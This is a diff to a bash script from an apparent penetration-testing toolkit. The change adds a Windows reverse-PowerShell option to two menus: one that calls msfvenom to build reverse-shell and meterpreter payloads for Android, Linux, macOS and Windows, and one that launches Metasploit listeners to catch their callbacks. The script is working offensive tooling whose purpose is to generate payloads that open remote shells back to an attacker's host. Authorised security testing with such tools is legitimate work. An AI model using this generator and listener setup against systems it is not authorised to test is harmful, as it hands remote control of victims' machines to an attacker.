@@ -3493,12 +3493,13 @@ f_banner
 echo -e "\x1B[1;34mMALICIOUS PAYLOADS\x1B[0m"
 echo
 echo "1.  android/meterpreter/reverse_tcp"
-echo "2   linux/x64/shell_reverse_tcp"
-echo "3.  linux/x86/meterpreter/reverse_tcp"
-echo "4.  osx/x64/shell_reverse_tcp"
-echo "5.  windows/meterpreter/reverse_tcp"
-echo "6.  windows/x64/meterpreter/reverse_tcp"
-echo "7.  Previous menu"
+echo "2.  cmd/windows/reverse_powershell"
+echo "3.  linux/x64/shell_reverse_tcp"
+echo "4.  linux/x86/meterpreter/reverse_tcp"
+echo "5.  osx/x64/shell_reverse_tcp"
+echo "6.  windows/meterpreter/reverse_tcp"
+echo "7.  windows/x64/meterpreter/reverse_tcp"
+echo "8.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
@@ -3509,32 +3510,37 @@ case $choice in
         format="raw"
         arch="dalvik"
 	   platform="android";;
-     2) payload="linux/x64/shell_reverse_tcp"
+     2) payload="cmd/windows/reverse_powershell"
+        extention=".bat"
+        format="raw"
+        arch="cmd"
+	   platform="windows";;
+     3) payload="linux/x64/shell_reverse_tcp"
         extention=""
         format="elf"
         arch="x86_64"
 	   platform="linux";;
-     3) payload="linux/x86/meterpreter/reverse_tcp"
+     4) payload="linux/x86/meterpreter/reverse_tcp"
         extention=""
         format="elf"
         arch="x86"
 	   platform="linux";;
-     4) payload="osx/x64/shell_reverse_tcp"
+     5) payload="osx/x64/shell_reverse_tcp"
 	   extention=""
 	   format="macho"
         arch="x86_64"
 	   platform="osx";;
-     5) payload="windows/meterpreter/reverse_tcp"
+     6) payload="windows/meterpreter/reverse_tcp"
 	   extention=".exe"
 	   format="exe"
         arch="x86"
 	   platform="windows";;
-     6) payload="windows/x64/meterpreter/reverse_tcp"
+     7) payload="windows/x64/meterpreter/reverse_tcp"
 	   extention=".exe"
 	   format="exe"
         arch="x86_64"
 	   platform="windows";;
-     7) f_main;;
+     8) f_main;;
      *) f_error;;
 esac
 
@@ -3559,6 +3565,7 @@ fi
 
 echo
 $msfv -p $payload LHOST=$lhost LPORT=$lport -f $format -a $arch --platform $platform -o $home/data/payload-$platform-$arch$extention
+
 echo
 echo
 exit
@@ -3572,24 +3579,26 @@ f_banner
 echo -e "\x1B[1;34mMetasploit LISTENERS\x1B[0m"
 echo
 echo "1.  android/meterpreter/reverse_tcp"
-echo "2   linux/x64/shell_reverse_tcp"
-echo "3.  linux/x86/meterpreter/reverse_tcp"
-echo "4.  osx/x64/shell_reverse_tcp"
-echo "5.  windows/meterpreter/reverse_tcp"
-echo "6.  windows/x64/meterpreter/reverse_tcp"
-echo "7.  Previous menu"
+echo "2.  cmd/windows/reverse_powershell"
+echo "3.  linux/x64/shell_reverse_tcp"
+echo "4.  linux/x86/meterpreter/reverse_tcp"
+echo "5.  osx/x64/shell_reverse_tcp"
+echo "6.  windows/meterpreter/reverse_tcp"
+echo "7.  windows/x64/meterpreter/reverse_tcp"
+echo "8.  Previous menu"
 echo
 echo -n "Choice: "
 read choice
 
 case $choice in
      1) payload="android/meterpreter/reverse_tcp";;
-     2) payload="linux/x64/shell_reverse_tcp";;
-     3) payload="linux/x86/meterpreter/reverse_tcp";;
-     4) payload="osx/x64/shell_reverse_tcp";;
-     5) payload="windows/meterpreter/reverse_tcp";;
-     6) payload="windows/x64/meterpreter/reverse_tcp";;
-     7) f_main;;
+     2) payload="cmd/windows/reverse_powershell";;
+     3) payload="linux/x64/shell_reverse_tcp";;
+     4) payload="linux/x86/meterpreter/reverse_tcp";;
+     5) payload="osx/x64/shell_reverse_tcp";;
+     6) payload="windows/meterpreter/reverse_tcp";;
+     7) payload="windows/x64/meterpreter/reverse_tcp";;
+     8) f_main;;
      *) f_error;;
 esac
 
@@ -3641,6 +3650,10 @@ if [[ -z $x ]]; then
 fi
 
 $msf -r /tmp/listener.rc
+
+echo
+echo
+exit
 }
 
 ##############################################################################################################
